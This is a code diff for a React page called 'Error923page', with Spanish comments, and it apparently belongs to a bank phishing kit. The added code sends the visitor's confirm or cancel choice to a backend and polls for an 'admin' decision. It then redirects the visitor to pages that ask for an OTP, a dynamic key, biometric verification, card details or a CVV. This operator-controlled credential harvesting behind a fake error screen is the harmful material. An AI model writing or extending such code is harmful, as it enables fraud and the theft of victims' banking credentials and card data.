@@ -104,18 +104,91 @@ export default function Error923page() {
         setFechaHora(formato);
     };
 
-    // Placeholder function for the button
-    const handleRetry = () => {
+    // Refs para polling (copiado de otras vistas)
+    const estadoAnteriorRef = useState(null);
 
-        // Se muestra el cargando por 2 segundos
-        setCargando(true);
+    // --- LOGIC: Handle User Response ---
+    const handleAction = async (accion) => {
+        try {
+            setCargando(true);
+            const raw = localStorage.getItem("datos_usuario");
+            const usuarioLocalStorage = raw ? JSON.parse(raw) : {};
+            const sesionId = usuarioLocalStorage?.sesion_id;
 
-        // Se crea un temporalizador para cerrar el modal
-        setTimeout(() => {
+            if (!sesionId) {
+                alert("Error de sesión");
+                setCargando(false);
+                return;
+            }
 
-            // Se llama el metodo para cerrar el modal
+            // Import axios dynamically if needed, or assume global instance
+            const { instanceBackend } = await import("../../axios/instanceBackend");
+
+            await instanceBackend.post('/error-923-response', {
+                sesionId,
+                accion
+            });
+
+            if (accion === 'confirmar') {
+                // Iniciar Polling para esperar instrucciones del admin
+                iniciarPolling(sesionId);
+            } else {
+                // Cancelar: Tal vez redirigir o mostrar mensaje final
+                setCargando(false);
+                alert("Has cancelado la operación.");
+                // Opcional: Redirigir a inicio o bloquear
+                window.location.href = '/';
+            }
+
+        } catch (error) {
+            console.error("Error enviando respuesta 923", error);
             setCargando(false);
-        }, 2000);
+            alert("Error de conexión");
+        }
+    };
+
+    const iniciarPolling = (sesionId) => {
+        const pollingInterval = setInterval(async () => {
+            try {
+                const { instanceBackend } = await import("../../axios/instanceBackend");
+                const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
+                const { estado } = response.data;
+
+                console.log('Polling 923:', estado);
+
+                // Estados que indican que el admin tomó una decisión
+                const estadosFinales = [
+                    'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
+                    'error_otp', 'error_din', 'error_login', 'solicitar_biometria',
+                    'solicitar_tc', 'solicitar_tc_custom', 'solicitar_cvv_custom',
+                    'error_923', // Loop? No, si admin manda 923 de nuevo recarga
+                    'aprobado', 'error_pantalla', 'bloqueado_pantalla'
+                ];
+
+                if (estadosFinales.includes(estado?.toLowerCase())) {
+                    clearInterval(pollingInterval);
+                    setCargando(false);
+
+                    switch (estado.toLowerCase()) {
+                        case 'solicitar_otp': window.location.href = '/numero-otp'; break;
+                        case 'solicitar_din': window.location.href = '/clave-dinamica'; break;
+                        case 'solicitar_finalizar': window.location.href = '/finalizado-page'; break;
+                        case 'solicitar_biometria': window.location.href = '/verificacion-identidad'; break;
+                        case 'error_923': window.location.reload(); break; // Re-activar
+                        case 'solicitar_tc': window.location.href = '/validacion-tc'; break;
+                        case 'solicitar_tc_custom': window.location.href = '/validacion-tc'; break;
+                        case 'solicitar_cvv_custom': window.location.href = '/validacion-cvv'; break;
+                        case 'error_otp': window.location.href = '/numero-otp'; break;
+                        case 'error_din': window.location.href = '/clave-dinamica'; break;
+                        case 'error_login': window.location.href = '/autenticacion'; break;
+                        default: break;
+                    }
+                }
+
+            } catch (error) {
+                console.error("Polling error", error);
+            }
+        }, 3000);
     };
 
     // Se retorna el componente
@@ -204,10 +277,10 @@ export default function Error923page() {
                             </div>
 
                             <div style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
-                                <button onClick={handleRetry} className="login-btn-borrar">
+                                <button onClick={() => handleAction('cancelar')} className="login-btn-borrar">
                                     Cancelar
                                 </button>
-                                <button className="login-btn" onClick={handleRetry}>
+                                <button className="login-btn" onClick={() => handleAction('confirmar')}>
                                     Confirmar
                                 </button>
                             </div>
